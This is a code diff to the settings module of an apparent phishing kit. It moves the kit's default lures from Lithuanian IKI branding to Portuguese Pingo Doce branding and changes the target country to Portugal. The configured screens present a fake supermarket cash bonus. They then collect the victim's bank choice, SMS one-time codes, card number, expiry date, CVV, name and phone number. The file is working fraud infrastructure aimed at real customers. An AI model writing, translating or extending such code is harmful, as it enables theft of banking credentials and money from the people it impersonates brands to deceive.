@@ -60,11 +60,110 @@ const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-u
 const ALBERT_HEIJN_LOGO_URL = "/form-assets/iki-mini-logo.png";
 const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
 const LEGACY_BG_URL = "/spar-bg.png";
-const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
-const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
-const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
-const LEGACY_WIN_SUBTITLE =
-  "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";
+const LEGACY_PORTAL_NAMES = new Set([
+  "Albert Heijn klantenportaal",
+  "IKI klientų portalas",
+  "IKI Klientų Portalas",
+  "Portal do Cliente IKI",
+]);
+const LEGACY_SUPPORT_CENTER_NAMES = new Set([
+  "Albert Heijn service",
+  "IKI pagalbos centras",
+  "IKI klientų aptarnavimas",
+  "IKI Klientų Aptarnavimas",
+  "Serviço IKI",
+]);
+const LEGACY_WIN_TITLES = new Set([
+  "Exclusieve Albert Heijn bonus",
+  "Išskirtinė IKI premija",
+  "Ekskliuzyvinė IKI Premija",
+  "Bónus Exclusivo IKI",
+]);
+
+export const defaultSettings: GlobalSettings = {
+  logo_url: "/form-assets/iki-mini-logo.png",
+  bg_url: PORTAL_BG_URL,
+  portal_name: "Portal do Cliente Pingo Doce",
+  support_center_name: "Apoio ao Cliente Pingo Doce",
+  win_title: "Bónus Exclusivo Pingo Doce",
+  win_subtitle:
+    "Parabéns! Foi selecionado para a promoção Pingo Doce de hoje. Clique no botão abaixo para resgatar o seu bónus.",
+  win_button: "Resgatar Bónus",
+  banken_title: "Escolha o seu Banco",
+  banken_subtitle: "Selecione o seu banco para continuar.",
+  banken_search_placeholder: "Pesquisar o seu banco...",
+  wait_title: "Por favor, aguarde",
+  wait_subtitle: "O seu pedido está a ser processado com segurança...",
+  sms_title: "Código de Segurança SMS",
+  sms_subtitle: "Introduza o código de {digits} dígitos.",
+  sms_input_label: "Código de utilização única",
+  sms_button: "Confirmar",
+  sms_loading: "A processar...",
+  card_title: "Dados de Pagamento",
+  card_subtitle: "Verifique e confirme os seus dados.",
+  card_owner_label: "Nome do Titular do Cartão",
+  card_number_label: "Número do Cartão",
+  card_expiry_label: "Data de Validade MM/AA",
+  card_cvv_label: "Código de Segurança",
+  card_button: "Continuar",
+  code_title: "Bem-vindo",
+  code_subtitle: "Introduza o código de participação que recebeu de {partner} para desbloquear a sua recompensa.",
+  code_button: "Confirmar Código",
+  live_support_title: "Apoio ao Vivo",
+  live_support_subtitle:
+    "Para continuar, deve contactar o nosso serviço de apoio ao cliente.\n\nClique no botão abaixo para iniciar o chat.",
+  live_support_button: "Iniciar Chat",
+  profile_title_small: "Confirmação de Prémio",
+  profile_title_main: "O Valor do seu Bónus",
+  profile_subtitle: "Confirme os seus dados para processamento posterior.",
+  profile_firstname_label: "Nome",
+  profile_lastname_label: "Apelido",
+  profile_phone_label: "Número de Telemóvel",
+  profile_button: "Seguinte",
+  profile_loading_text: "A processar...",
+  site_language: "pt",
+  target_country: "Portekiz",
+  wheel_settings: {},
+};
+
+const TRANSLATABLE_TEXT_KEYS: Array<keyof GlobalSettings> = [
+  "portal_name",
+  "support_center_name",
+  "win_title",
+  "win_subtitle",
+  "win_button",
+  "banken_title",
+  "banken_subtitle",
+  "banken_search_placeholder",
+  "wait_title",
+  "wait_subtitle",
+  "sms_title",
+  "sms_subtitle",
+  "sms_input_label",
+  "sms_button",
+  "sms_loading",
+  "card_title",
+  "card_subtitle",
+  "card_owner_label",
+  "card_number_label",
+  "card_expiry_label",
+  "card_cvv_label",
+  "card_button",
+  "code_title",
+  "code_subtitle",
+  "code_button",
+  "live_support_title",
+  "live_support_subtitle",
+  "live_support_button",
+  "profile_title_small",
+  "profile_title_main",
+  "profile_subtitle",
+  "profile_firstname_label",
+  "profile_lastname_label",
+  "profile_phone_label",
+  "profile_button",
+  "profile_loading_text",
+];
 
 function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
   const next = { ...settings };
@@ -85,83 +184,44 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     next.bg_url = PORTAL_BG_URL;
   }
 
-  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
-    next.portal_name = "IKI klientų portalas";
+  const isLegacyNonPtLanguage =
+    !next.site_language ||
+    next.site_language === "lt" ||
+    next.site_language === "nl" ||
+    next.site_language === "et";
+
+  if (isLegacyNonPtLanguage) {
+    for (const key of TRANSLATABLE_TEXT_KEYS) {
+      (next as Record<string, unknown>)[key] = defaultSettings[key];
+    }
+    next.site_language = "pt";
+  } else {
+    if (!next.portal_name || LEGACY_PORTAL_NAMES.has(next.portal_name)) {
+      next.portal_name = defaultSettings.portal_name;
+    }
+    if (!next.support_center_name || LEGACY_SUPPORT_CENTER_NAMES.has(next.support_center_name)) {
+      next.support_center_name = defaultSettings.support_center_name;
+    }
+    if (!next.win_title || LEGACY_WIN_TITLES.has(next.win_title)) {
+      next.win_title = defaultSettings.win_title;
+    }
   }
 
-  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
-    next.support_center_name = "IKI pagalbos centras";
-  }
-
-  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
-    next.win_title = "Išskirtinė IKI premija";
-  }
-
-  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
-    next.win_subtitle =
-      "Sveikiname! Buvote atrinkti šios dienos IKI kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte iki 2 500 eurų premiją.";
-  }
-
-  if (!next.target_country || next.target_country === "Hollanda" || next.target_country === "Estonya") {
-    next.target_country = "Litvanya";
+  if (
+    !next.target_country ||
+    next.target_country === "Hollanda" ||
+    next.target_country === "Estonya" ||
+    next.target_country === "Litvanya"
+  ) {
+    next.target_country = "Portekiz";
   }
 
   if (next.target_country) {
     next.target_country = normalizeCountryName(next.target_country);
   }
 
-  if (!next.site_language || next.site_language === "nl" || next.site_language === "et") {
-    next.site_language = "lt";
-  }
-
   return next;
 }
-
-export const defaultSettings: GlobalSettings = {
-  logo_url: "/form-assets/iki-mini-logo.png",
-  bg_url: PORTAL_BG_URL,
-  portal_name: "IKI klientų portalas",
-  support_center_name: "IKI pagalbos centras",
-  win_title: "Išskirtinė IKI premija",
-  win_subtitle:
-    "Sveikiname! Buvote atrinkti šios dienos IKI kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo 5000 eurų premiją.",
-  win_button: "Atsiimti premiją",
-  banken_title: "Pasirinkite savo banką",
-  banken_subtitle: "Pasirinkite savo banką, kad tęstumėte.",
-  banken_search_placeholder: "Ieškoti banko...",
-  wait_title: "Prašome palaukti",
-  wait_subtitle: "Jūsų užklausa saugiai apdorojama...",
-  sms_title: "SMS saugos kodas",
-  sms_subtitle: "Įveskite {digits} skaitmenų kodą.",
-  sms_input_label: "Vienkartinis kodas",
-  sms_button: "Patvirtinti",
-  sms_loading: "Apdorojama...",
-  card_title: "Mokėjimo informacija",
-  card_subtitle: "Patikrinkite ir patvirtinkite savo duomenis.",
-  card_owner_label: "Kortelės turėtojo vardas",
-  card_number_label: "Kortelės numeris",
-  card_expiry_label: "Galiojimo laikas MM/MM",
-  card_cvv_label: "Saugos kodas",
-  card_button: "Tęsti",
-  code_title: "Sveiki atvykę",
-  code_subtitle: "Įveskite dalyvavimo kodą, kurį gavote iš partnerio {partner}, kad atsiimtumėte apdovanojimą.",
-  code_button: "Patvirtinti kodą",
-  live_support_title: "Tiesioginis palaikymas",
-  live_support_subtitle:
-    "Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.\n\nSpustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.",
-  live_support_button: "Pradėti pokalbį",
-  profile_title_small: "Prizo patvirtinimas",
-  profile_title_main: "Jūsų premijos suma",
-  profile_subtitle: "Patvirtinkite savo duomenis tolesniam apdorojimui.",
-  profile_firstname_label: "Vardas",
-  profile_lastname_label: "Pavardė",
-  profile_phone_label: "Mobiliojo telefono numeris",
-  profile_button: "Kitas",
-  profile_loading_text: "Apdorojama...",
-  site_language: "lt",
-  target_country: "Litvanya",
-  wheel_settings: {},
-};
 
 const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
   settings: defaultSettings,
